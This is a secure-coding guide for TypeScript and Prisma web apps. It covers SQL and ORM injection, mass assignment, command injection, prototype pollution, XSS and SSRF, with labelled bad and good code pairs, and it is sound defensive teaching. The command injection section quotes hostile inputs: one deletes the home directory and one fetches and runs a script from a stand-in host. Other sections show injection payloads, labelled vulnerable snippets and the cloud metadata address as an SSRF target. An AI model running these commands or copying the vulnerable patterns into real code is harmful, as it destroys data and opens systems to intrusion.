# Data Access & Input Validation

## SQL Injection

Always use parameterized queries or ORM methods. Never concatenate user input into SQL strings:

```typescript
// BAD: SQL injection via string concatenation
const result = await db.query(`SELECT * FROM users WHERE id = '${userId}'`);

// GOOD: parameterized query
const result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);
```

## ORM Safety (Prisma)

Even with an ORM, injection is possible:

- **Validate input types with Zod before passing to Prisma.** `findFirst` and similar methods are vulnerable to operator injection if unvalidated objects are passed as filter values. An attacker can send `{ "email": { "contains": "" } }` to match all records.

```typescript
// BAD: raw request body passed directly to Prisma
const user = await prisma.user.findFirst({ where: req.body });

// GOOD: validate with Zod first
const schema = z.object({ email: z.string().email() });
const parsed = schema.parse(req.body);
const user = await prisma.user.findFirst({ where: { email: parsed.email } });
```

- **Never use `$queryRawUnsafe` or `$executeRawUnsafe` with user-supplied input.** These bypass Prisma's parameterization entirely.

```typescript
// BAD: raw SQL with user input
const results = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE name = '${name}'`
);

// GOOD: use the safe raw query with parameters
const results = await prisma.$queryRaw`
  SELECT * FROM users WHERE name = ${name}
`;
```

## Input Validation

Validate all external input at system boundaries using a runtime schema validator (Zod, Yup, Joi, etc.):

- API route handlers
- Server Actions
- Webhook handlers
- Form submissions
- URL parameters and query strings

Don't rely on TypeScript types alone — they're compile-time only and don't exist at runtime. An attacker sending a malformed request bypasses all TypeScript checks.

```typescript
// TypeScript type provides NO runtime protection
type CreateUserInput = { name: string; email: string };

// Zod schema provides ACTUAL runtime validation
const CreateUserSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
});
```

## Mass Assignment

Don't spread request bodies directly into database operations. An attacker can add unexpected fields:

```typescript
// BAD: attacker can add { isAdmin: true, credits: 99999 }
await db.users.update({ where: { id }, data: req.body });

// GOOD: pick only allowed fields
const { name, email } = validated.data;
await db.users.update({ where: { id }, data: { name, email } });
```

## Command Injection

Never build a shell command from user input. Passing a string to a shell lets `; rm -rf ~` or `$(curl evil.sh | sh)` run on your server:

```typescript
// BAD: the filename is interpreted by a shell
exec(`convert ${req.body.file} out.png`);

// GOOD: no shell; arguments are passed as a list
execFile('convert', [file, 'out.png']);
```

Input starting with `-` can still be read as an option, so validate it (e.g. allow only generated filenames), and put `--` before it for commands that support that, such as `git`. Python: `subprocess.run(['convert', file, 'out.png'])`, never `shell=True` or `os.system` with user input. Never pass user input to `eval`, `new Function`, `vm`, Python's `eval`/`exec`, `pickle.loads` or `yaml.load` (use `yaml.safe_load`).

## Prototype Pollution (JavaScript)

Deep-merging untrusted JSON into an object lets an attacker send `{"__proto__": {"isAdmin": true}}` and give *every* object an `isAdmin` property:

- Don't deep-merge request bodies into config, defaults or user objects. Validate with a schema first (Zod's `z.object` drops unknown keys by default).
- Reject the keys `__proto__`, `constructor` and `prototype` in any code that copies user-supplied keys.
- Use `Map` or `Object.create(null)` for lookups keyed by user input.

## Cross-Site Scripting (XSS)

React escapes text by default, so XSS in React apps comes through the escape hatches:

- `dangerouslySetInnerHTML` with anything a user wrote: sanitize it with DOMPurify first, or don't render it as HTML. The same goes for `innerHTML`, Vue's `v-html` and Svelte's `{@html}`.
- Links from user input: `<a href={profile.website}>` runs `javascript:` URLs when clicked. Allow only `http:` and `https:`:

```typescript
const safeUrl = (url: string) => {
  try {
    return ['http:', 'https:'].includes(new URL(url).protocol) ? url : undefined;
  } catch {
    return undefined;
  }
};
```

- Markdown from users: keep raw HTML off. react-markdown does by default; don't add `rehype-raw` without `rehype-sanitize`. HTML from `marked` or similar needs DOMPurify.
- Data written into a `<script>` tag (`JSON.stringify` of server data): escape `<` as `\u003c`, or a `</script>` in user data ends the tag.
- A Content-Security-Policy (see `deployment.md`) limits the damage when one slips through.

## Server-Side Request Forgery (SSRF)

Any feature where the server fetches a URL the user supplies (link previews, "import from URL", user-configured webhooks, image proxies, AI tools that browse) can be pointed at addresses only the server can reach: `http://169.254.169.254/` hands out cloud credentials, `localhost` runs admin panels, and internal databases sit on private addresses.

- Allow only `https:` (and `http:` if you must). If you can list the hosts you need, allow only those.
- Otherwise resolve the hostname and reject private, loopback, link-local and metadata addresses: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, `0.0.0.0`, `::1`, `fc00::/7`, `fe80::/10`, and IPv4 written as IPv6 (`::ffff:127.0.0.1`). Check the address you actually connect to, in an HTTP agent or proxy, or DNS can return a different one after your check.
- Don't follow redirects blindly: a public URL can redirect to an internal one. Use `fetch(url, { redirect: 'manual' })` and check each hop.
- Set a timeout and a size limit, and don't show the raw response or error to the user.
